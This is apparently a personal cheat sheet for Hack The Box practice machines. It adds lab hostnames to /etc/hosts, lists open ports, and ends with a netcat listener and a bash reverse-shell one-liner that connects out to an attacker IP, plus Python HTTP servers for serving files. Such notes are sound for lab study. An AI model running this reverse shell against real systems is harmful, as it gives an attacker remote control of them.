## Shell
echo to host file
```sh
echo "10.129.152.215 unika.htb" | sudo tee -a /etc/hosts
```

```sh
echo "10.129.108.117 thetoppers.htb" | sudo tee -a /etc/hosts
```

```sh
echo "10.129.108.117 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

```sh
echo "10.129.1.27 ignition.htb" | sudo tee -a /etc/hosts
```

liste aller offenen Ports

```sh
-l: Display only listening sockets.
-t: Display TCP sockets.
-n: Do not try to resolve service names.

ss -tln

```
```sh
sudo netstat -tulnp
```

open reverse shell

### Reverse shell Server
```sh
#create a listener for shell session
nc -nvlp 1337


#!/bin/bash
bash -i >& /dev/tcp/10.10.15.71/1337 0>&1

python3 -m http.server 8000

```
### get own ip
```
ip a | grep tun0 

```

```sh
python -m http.server 8001
```